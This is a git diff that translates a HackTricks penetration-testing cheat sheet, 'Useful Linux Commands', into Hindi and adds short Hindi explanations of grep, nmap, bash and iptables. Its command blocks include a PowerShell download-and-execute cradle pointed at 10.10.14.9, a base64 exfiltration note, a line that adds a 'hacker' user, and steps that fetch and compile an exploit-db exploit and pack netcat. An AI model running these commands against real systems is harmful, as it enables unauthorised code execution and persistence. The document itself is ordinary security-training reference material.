@@ -1,10 +1,10 @@
-# Useful Linux Commands
+# उपयोगी Linux कमांड
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करके आसानी से बनाएं और **स्वचालित कार्यप्रवाह** बनाएं, जो दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित होते हैं।\
+आज ही पहुंच प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -12,16 +12,15 @@ Get Access Today:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
+* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
+* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **अपने हैकिंग ट्रिक्स साझा करें,** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके।**
 
 </details>
 
-## Common Bash
-
+## सामान्य बैश
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -73,7 +72,7 @@ unzip file.zip
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker  
+useradd -p 'openssl passwd -1 <Password>' hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -140,21 +139,19 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-
 <figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से वर्ल्ड के सबसे उन्नत सामुदायिक उपकरणों द्वारा संचालित **वर्कफ़्लो** बनाएं और स्वचालित करें।\
+आज ही पहुंच प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Bash for Windows
-
+## विंडोज के लिए बैश
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
- 
+
 #Exe compression
 upx -9 nc.exe
 
@@ -163,16 +160,29 @@ wine exe2bat.exe nc.exe nc.txt
 
 #Compile Windows python exploit to exe
 pip install pyinstaller
-wget -O exploit.py http://www.exploit-db.com/download/31853  
+wget -O exploit.py http://www.exploit-db.com/download/31853
 python pyinstaller.py --onefile exploit.py
 
 #Compile for windows
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
+## ग्रेप्स
 
-## Greps
+ग्रेप्स एक शक्तिशाली लिनक्स कमांड है जो टेक्स्ट फ़ाइलों में खोज करने की क्षमता प्रदान करता है। यह एक विशेष शब्द, पैटर्न, या वाक्यांश को खोजने के लिए उपयोग किया जा सकता है। ग्रेप्स कमांड का उपयोग डायरेक्टरी, फ़ाइल, या पाइप के माध्यम से किया जा सकता है। इसका उपयोग लिनक्स सिस्टम पर खोज और फ़िल्टरिंग करने के लिए किया जाता है।
 
+यहां कुछ उपयोगी ग्रेप्स कमांड हैं:
+
+- `grep pattern file`: एक फ़ाइल में एक पैटर्न खोजें।
+- `grep -r pattern directory`: एक डायरेक्टरी में एक पैटर्न खोजें (सभी उपडिरेक्टरी में भी)।
+- `grep -i pattern file`: एक फ़ाइल में एक पैटर्न खोजें (मामले को अनदेखा करें)।
+- `grep -v pattern file`: एक फ़ाइल में एक पैटर्न को नहीं खोजें (उलटा)।
+- `grep -l pattern file`: फ़ाइलों की सूची में वह फ़ाइलें दिखाएं जिनमें पैटर्न मौजूद है।
+- `grep -n pattern file`: एक फ़ाइल में पैटर्न के साथ पंक्ति संख्या दिखाएं।
+- `grep -E pattern file`: एक फ़ाइल में एक विस्तृत पैटर्न खोजें (विस्तृत शब्दकोश का उपयोग करें)।
+- `grep -o pattern file`: एक फ़ाइल में पैटर्न को खोजें और केवल मिले हुए शब्दों को प्रदर्शित करें।
+
+ग्रेप्स कमांड के साथ आप टेक्स्ट फ़ाइलों में खोज करके जरूरी डेटा को ढूंढ सकते हैं और अनुचित या संदिग्ध जानकारी को फ़िल्टर कर सकते हैं।
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -252,25 +262,72 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
+## Nmap खोज मदद
 
-## Nmap search help
+Nmap (Network Mapper) एक खुला स्रोत नेटवर्क स्कैनर है जिसका उपयोग नेटवर्क इन्वेंटरी, सुरक्षा आँकड़े और नेटवर्क विश्लेषण के लिए किया जाता है। Nmap के बहुत सारे विशेषताएं हैं जो आपको नेटवर्क की संरचना, उपकरणों, सेवाओं और उनके संस्करणों के बारे में जानकारी प्रदान करती हैं।
 
+यदि आप Nmap का उपयोग करके खोज करना चाहते हैं, तो आप निम्नलिखित आदेशों का उपयोग कर सकते हैं:
+
+- `nmap -sn <IP>`: इस आदेश का उपयोग करके आप नेटवर्क में उपलब्ध होने वाले होस्टों की खोज कर सकते हैं।
+- `nmap -p <port> <IP>`: इस आदेश का उपयोग करके आप एक निर्दिष्ट पोर्ट पर खुली सेवाओं की खोज कर सकते हैं।
+- `nmap -sV <IP>`: इस आदेश का उपयोग करके आप नेटवर्क में उपलब्ध होने वाली सेवाओं के संस्करण की खोज कर सकते हैं।
+- `nmap -A <IP>`: इस आदेश का उपयोग करके आप एक होस्ट के बारे में विस्तृत जानकारी प्राप्त कर सकते हैं, जैसे ऑपरेटिंग सिस्टम, सेवाएं, और उनके संस्करण।
+
+ये कुछ मात्रा में Nmap के उपयोगी आदेश हैं। आप अधिक विस्तृत जानकारी के लिए Nmap की मैन पेज का उपयोग कर सकते हैं।
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
+## बैश
 
-## Bash
+Bash (बैश) एक लिनक्स और यूनिक्स परिवार का डिफ़ॉल्ट शेल है। यह एक इंटरैक्टिव टेक्स्ट मोड का उपयोग करके यूज़र को लिनक्स सिस्टम पर कमांड चलाने की अनुमति देता है। बैश कमांड इंटरप्रेटर के रूप में काम करता है और यह यूज़र को शेल स्क्रिप्ट लिखने और चलाने की भी अनुमति देता है।
 
+यहां कुछ उपयोगी बैश कमांड हैं:
+
+### फ़ाइल और फ़ोल्डर
+
+- `ls`: फ़ाइल और फ़ोल्डर की सूची दिखाएं
+- `cd`: फ़ोल्डर बदलें
+- `pwd`: मौजूदा फ़ोल्डर का पथ दिखाएं
+- `mkdir`: नया फ़ोल्डर बनाएं
+- `rm`: फ़ाइल या फ़ोल्डर हटाएं
+- `cp`: फ़ाइल या फ़ोल्डर कॉपी करें
+- `mv`: फ़ाइल या फ़ोल्डर को मूव करें
+
+### प्रक्रिया और सेवा
+
+- `ps`: चल रही प्रक्रियाओं की सूची दिखाएं
+- `top`: सिस्टम के लिए चल रही प्रक्रियाओं की जानकारी दिखाएं
+- `kill`: प्रक्रिया को बंद करें
+- `service`: सेवा को नियंत्रित करें
+- `systemctl`: सिस्टम सेवाओं को नियंत्रित करें
+
+### नेटवर्क
+
+- `ifconfig`: नेटवर्क इंटरफ़ेस की जानकारी दिखाएं
+- `ping`: होस्ट को पिंग करें
+- `netstat`: नेटवर्क कनेक्शन की जानकारी दिखाएं
+- `ssh`: रिमोट मशीन पर सुरक्षित शेल सत्र शुरू करें
+
+ये कुछ उपयोगी बैश कमांड हैं, लेकिन इसके अलावा भी बहुत सारे कमांड हैं जो आपको लिनक्स सिस्टम पर काम करने में मदद कर सकते हैं।
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
+## आईपीटेबल्स
 
-## Iptables
+Iptables एक लिनक्स फ़ायरवॉल उपकरण है जो नेटवर्क ट्रैफ़िक को नियंत्रित करने के लिए उपयोग होता है। यह नियंत्रण सूची (rule set) का उपयोग करके आउटगोइंग और इनगोइंग ट्रैफ़िक को अनुमति देता है या रोकता है। इसका उपयोग नेटवर्क सुरक्षा को सुधारने और नियंत्रित करने के लिए किया जाता है।
 
+यहां कुछ उपयोगी आईपीटेबल्स कमांड हैं:
+
+- `iptables -L`: वर्तमान नियंत्रण सूची को देखने के लिए उपयोग किया जाता है।
+- `iptables -A`: नई नियंत्रण सूची निर्माण के लिए उपयोग किया जाता है।
+- `iptables -D`: मौजूदा नियंत्रण सूची को हटाने के लिए उपयोग किया जाता है।
+- `iptables -P`: डिफ़ॉल्ट नियंत्रण सूची निर्धारित करने के लिए उपयोग किया जाता है।
+
+आप इन कमांड का उपयोग करके आईपीटेबल्स को कन्फ़िगर कर सकते हैं और अपने लिनक्स सिस्टम की सुरक्षा को मजबूत कर सकते हैं।
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -301,23 +358,22 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने की उपलब्धता चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
+* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
+* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से बनाएं और **स्वचालित कार्यप्रवाह** को चलाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित होता है।\
+आज ही पहुंच प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
